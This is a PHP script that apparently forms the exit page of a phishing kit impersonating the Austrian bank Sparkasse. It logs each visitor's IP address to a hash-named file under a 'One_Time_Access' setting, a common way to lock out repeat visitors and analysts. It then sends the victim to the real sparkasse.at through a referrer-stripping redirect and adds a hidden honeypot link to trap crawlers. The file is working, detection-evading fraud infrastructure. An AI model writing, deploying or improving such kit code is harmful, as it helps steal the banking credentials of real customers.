<?php
require('../CONFIG.php');
session_start();
$line = $_SERVER['REMOTE_ADDR'];
if($One_Time_Access == "on"){
    file_put_contents('../2617d44145d0300cdf70349b2f3cac79.txt', $line . PHP_EOL, FILE_APPEND);
}
header("Location: https://href.li/?https://sparkasse.at");
session_destroy();
?>
<a rel="nofollow" style="display:none;" href="vendor/" title="Do NOT follow this link or you will be banned from the site!">Do NOT follow this link or you will be banned from the site!</a>